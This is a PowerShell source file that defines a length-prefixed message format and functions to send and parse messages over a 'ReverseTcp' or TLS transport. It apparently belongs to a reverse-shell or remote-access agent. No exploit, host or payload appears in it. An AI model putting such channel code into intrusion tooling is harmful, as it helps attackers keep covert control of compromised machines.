$MESSAGE_HEADER_LEN = 5

function Message-Create {
    <#
        .SYNOPSIS
        create a new message from these fields
        .PARAMETER MType
        type field of the message
        .PARAMETER Content
        content
    #>
    param(
        [Parameter(Mandatory=$true)]
        [Byte]
        $MType,

        [Parameter(Mandatory=$true)]
        [String]
        $Content
    )

	$len1 = $Content | Measure-Object -Character;
	$len2 = $len1.Characters
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'leng' = $len2
       'content' = $Content
    }
}

function Message-SendToTransport([PSObject] $msg, [PSObject] $transport) {
	$len = [System.Net.IPAddress]::HostToNetworkOrder([Int32]$msg.leng)
	$data = $msg.mtype -join '' #[char[]][BitConverter]::GetBytes([Char] ) -join ''
	$data += [char[]][BitConverter]::GetBytes([Int32] $len) -join ''
	$data += $msg.content

    if ($CHANNELENCRYPTION -eq "NONE") {
    	Transport-ReverseTcp-Send $transport $data
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        Transport-Tls-Send $transport $data
    }
}

function Message-ParseFromTransport([PSObject] $transport) {
    if ($CHANNELENCRYPTION -eq "NONE") {
    	$buf = Transport-ReverseTcp-Receive $transport $MESSAGE_HEADER_LEN
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $buf = Transport-Tls-Receive $transport $MESSAGE_HEADER_LEN
    }
    
	$MType = [Byte] $buf[0]
	$leng = [Int32][BitConverter]::ToInt32($buf, 1)
	$leng = [System.Net.IPAddress]::NetworkToHostOrder([Int32]$leng)

    if ($CHANNELENCRYPTION -eq "NONE") {
    	$Content = Transport-ReverseTcp-Receive $transport $leng
    } elseif ($CHANNELENCRYPTION -eq "TLS") {
        $Content = Transport-Tls-Receive $transport $leng
    }
	
    return New-Object -TypeName PSObject -Property @{
       'mtype' = $MType
       'leng' = $leng
       'content' = $Content
    }
}
